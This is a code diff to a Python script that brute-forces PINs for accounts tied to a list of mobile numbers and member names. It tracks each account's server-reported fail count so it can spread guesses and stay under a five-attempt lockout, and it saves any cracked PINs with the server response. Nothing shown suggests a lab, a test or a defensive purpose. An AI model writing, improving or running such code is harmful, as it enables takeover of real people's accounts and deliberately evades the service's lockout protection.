@@ -61,6 +61,9 @@ def try_pin(mobile, pin):
 STATE_FILE = "pin_state.json"
 
 
+PER_ACCOUNT = int(os.environ.get("PIN_PER_ACCOUNT", "2"))
+
+
 def main():
     if not os.path.exists(MEMBERS_FILE):
         log("no members_live.csv yet")
@@ -78,15 +81,21 @@ def main():
         mobile, name, fc, left, ts = row[0], row[1], int(row[2]), int(row[3]), row[4]
         if mobile in cracked:
             continue
-        prev_tried = state.get(mobile, {}).get("tried", [])
-        eff_left = left - len(prev_tried)
+        rec = state.get(mobile, {})
+        prev_tried = rec.get("tried", [])
+        server_fc = rec.get("serverFc")
+        if server_fc is not None:
+            eff_left = max(0, 5 - server_fc)
+        else:
+            eff_left = left - len(prev_tried)
         if eff_left <= 0:
-            log(f"SKIP {mobile} {name} (budget spent: {prev_tried})")
+            log(f"SKIP {mobile} {name} (budget spent: {prev_tried} fc={server_fc})")
             continue
-        log(f"ATTACK {mobile} {name} eff_left={eff_left} prev={prev_tried}")
+        budget = min(eff_left, PER_ACCOUNT)
+        log(f"ATTACK {mobile} {name} eff_left={eff_left} budget={budget} prev={prev_tried}")
         used = 0
         for pin in ALL_PINS:
-            if used >= eff_left:
+            if used >= budget:
                 break
             if pin in prev_tried:
                 continue
@@ -95,16 +104,20 @@ def main():
                 continue
             used += 1
             prev_tried.append(pin)
-            state[mobile] = {"tried": prev_tried, "name": name}
-            json.dump(state, open(STATE_FILE, "w"), ensure_ascii=False, indent=1)
             data = resp.get("data") or {}
+            fc_now = data.get("failCount")
+            if isinstance(fc_now, int):
+                rec["serverFc"] = fc_now
+            rec["tried"] = prev_tried
+            rec["name"] = name
+            state[mobile] = rec
+            json.dump(state, open(STATE_FILE, "w"), ensure_ascii=False, indent=1)
             if resp.get("success"):
                 log(f"★★★ CRACKED {mobile} {name} pin={pin}")
                 cracked[mobile] = {"name": name, "pin": pin, "resp": resp, "ts": int(time.time())}
                 json.dump(cracked, open(CRACKED_FILE, "w"), ensure_ascii=False, indent=1)
                 break
             msg = data.get("message", "")
-            fc_now = data.get("failCount")
             log(f"  {mobile} {pin} -> fc={fc_now} {msg[:40]}")
             if fc_now is not None and fc_now >= 5:
                 break
